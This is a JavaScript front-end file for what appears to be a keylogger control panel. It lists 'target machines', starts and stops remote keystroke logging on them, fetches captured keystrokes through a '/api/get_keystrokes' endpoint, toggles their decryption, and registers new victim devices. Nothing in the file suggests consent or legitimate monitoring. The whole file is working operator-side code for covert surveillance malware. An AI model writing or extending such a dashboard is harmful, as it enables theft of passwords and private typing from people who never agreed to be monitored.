// Device management
let devices = [];
let isEncrypted = {};  // Store encryption state for each device

async function refreshDevices() {
    try {
        const response = await fetch('/api/get_target_machines_list');
        if (response.ok) {
            const devicesList = await response.json();
            updateDevicesList(devicesList);
        } else if (response.status === 401) {
            window.location.href = '/login';
        }
    } catch (error) {
        console.error('Error fetching devices:', error);
        showAlert('Error fetching devices list', 'danger');
    }
}

function updateDevicesList(devices) {
    const container = document.getElementById('devices-list');
    container.innerHTML = '';
    
    if (devices.length === 0) {
        container.innerHTML = '<div class="alert alert-info">No devices connected</div>';
        return;
    }
    
    devices.forEach(device => {
        // Set initial state for encryption
        if (!encryptionState.hasOwnProperty(device.device_id)) {
            encryptionState[device.device_id] = false;
        }
        
        const deviceHtml = `
            <div class="device-item mb-3" data-device-id="${device.device_id}">
                <div class="card">
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <h5 class="card-title">${device.name || device.device_id}</h5>
                                <p class="card-text device-id">${device.device_id}</p>
                            </div>
                            <span class="badge ${device.is_active ? 'bg-success' : 'bg-danger'} device-status">
                                ${device.is_active ? 'Active' : 'Inactive'}
                            </span>
                        </div>
                        
                        <div class="device-info small text-muted mb-3">
                            <div><i class="bi bi-clock"></i> Last seen: ${formatDate(device.last_seen || new Date())}</div>
                        </div>
                        
                        <div class="btn-group mb-3">
                            <button class="btn btn-success start-logging" onclick="startLogging(this)" disabled>
                                <i class="bi bi-play-circle"></i> Start
                            </button>
                            <button class="btn btn-danger stop-logging" onclick="stopLogging(this)" disabled>
                                <i class="bi bi-stop-circle"></i> Stop
                            </button>
                            <button class="btn btn-primary view-logs" onclick="viewLogs(this)">
                                <i class="bi bi-eye"></i> View Logs
                            </button>
                            <button class="btn btn-secondary toggle-encryption" onclick="toggleEncryption(this)">
                                <i class="bi bi-lock"></i> <span>Decrypt</span>
                            </button>
                            <button class="btn btn-danger" onclick="removeDevice(this)">
                                <i class="bi bi-trash"></i> Remove
                            </button>
                        </div>
                        
                        <div class="logs-container mt-3" style="display: none;">
                            <div class="card">
                                <div class="card-body">
                                    <pre class="logs-content">No logs available</pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
        container.insertAdjacentHTML('beforeend', deviceHtml);
        
        // Update button states after adding to DOM
        const deviceItem = container.lastElementChild;
        const startBtn = deviceItem.querySelector('.start-logging');
        const stopBtn = deviceItem.querySelector('.stop-logging');
        
        if (device.is_active) {
            // When device is active, enable both buttons but set their states opposite to each other
            startBtn.disabled = false;
            stopBtn.disabled = true;
        } else {
            // When device is inactive, disable both start and stop buttons
            startBtn.disabled = true;
            stopBtn.disabled = true;
        }
    });
}

function formatDate(dateString) {
    if (!dateString) return 'Never';
    const date = new Date(dateString);
    return date.toLocaleString();
}

async function startLogging(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        console.log('Starting logging for device:', deviceId);
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'start'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('Start response:', data);
            
            // Update UI immediately
            const startBtn = deviceItem.querySelector('.start-logging');
            const stopBtn = deviceItem.querySelector('.stop-logging');
            const statusBadge = deviceItem.querySelector('.device-status');
            
            startBtn.disabled = true;
            stopBtn.disabled = false;  // Enable stop button when logging starts
            statusBadge.className = 'badge bg-success device-status';
            statusBadge.textContent = 'Active';
            
            showAlert(data.message || 'Logging started', 'success');
        } else {
            const error = await response.json();
            console.error('Start error:', error);
            showAlert(error.error || 'Error starting logging', 'danger');
        }
    } catch (error) {
        console.error('Error starting logging:', error);
        showAlert('Error starting logging', 'danger');
    }
}

async function stopLogging(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        console.log('Stopping logging for device:', deviceId);
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'stop'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('Stop response:', data);
            
            // Update UI immediately
            const startBtn = deviceItem.querySelector('.start-logging');
            const stopBtn = deviceItem.querySelector('.stop-logging');
            const statusBadge = deviceItem.querySelector('.device-status');
            
            startBtn.disabled = false;  // Enable start button when logging stops
            stopBtn.disabled = true;
            statusBadge.className = 'badge bg-danger device-status';
            statusBadge.textContent = 'Inactive';
            
            showAlert(data.message || 'Logging stopped', 'success');
        } else {
            const error = await response.json();
            console.error('Stop error:', error);
            showAlert(error.error || 'Error stopping logging', 'danger');
        }
    } catch (error) {
        console.error('Error stopping logging:', error);
        showAlert('Error stopping logging', 'danger');
    }
}

let encryptionState = {};

function toggleEncryption(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    // Toggle the encryption state for this device
    encryptionState[deviceId] = !encryptionState[deviceId];
    
    // Update button text and icon
    const span = btn.querySelector('span');
    const icon = btn.querySelector('i');
    if (encryptionState[deviceId]) {
        span.textContent = 'Encrypt';
        icon.className = 'bi bi-unlock';
    } else {
        span.textContent = 'Decrypt';
        icon.className = 'bi bi-lock';
    }
    
    // Refresh logs with new encryption state
    const logsContainer = deviceItem.querySelector('.logs-container');
    if (logsContainer.style.display !== 'none') {
        viewLogs(deviceItem.querySelector('.view-logs'));
    }
}

async function viewLogs(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    const logsContainer = deviceItem.querySelector('.logs-container');
    const logsContent = logsContainer.querySelector('.logs-content');
    
    try {
        const response = await fetch(`/api/get_keystrokes?machine=${deviceId}&encrypted=${encryptionState[deviceId] || false}`);
        if (response.ok) {
            const data = await response.json();
            logsContent.textContent = data.data;
            logsContainer.style.display = logsContainer.style.display === 'none' ? 'block' : 'none';
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error fetching logs', 'danger');
        }
    } catch (error) {
        console.error('Error fetching logs:', error);
        showAlert('Error fetching logs', 'danger');
    }
}

async function removeDevice(btn) {
    if (!confirm('Are you sure you want to remove this device?')) return;
    
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        const response = await fetch('/api/remove_device', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ device_id: deviceId })
        });
        
        if (response.ok) {
            deviceItem.remove();
            showAlert('Device removed successfully', 'success');
            await refreshDevices();
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error removing device', 'danger');
        }
    } catch (error) {
        console.error('Error removing device:', error);
        showAlert('Error removing device', 'danger');
    }
}

async function createNewConnection() {
    try {
        const deviceId = 'Device-' + Math.random().toString(36).substr(2, 9);
        const response = await fetch('/api/register_device', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                device_id: deviceId,
                name: `MacBook-${deviceId}`
            })
        });
        
        if (response.ok) {
            showAlert('New device registered successfully', 'success');
            refreshDevices();
        } else if (response.status === 401) {
            // Redirect to login page
            window.location.href = '/login';
        }
    } catch (error) {
        console.error('Error creating new connection:', error);
        showAlert('Error creating new connection', 'danger');
    }
}

function showAlert(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    document.querySelector('.container').insertAdjacentElement('afterbegin', alertDiv);
    
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

// Initial load
document.addEventListener('DOMContentLoaded', () => {
    refreshDevices();
});

// Add periodic status updates
setInterval(refreshDevices, 30000); // Update every 30 seconds 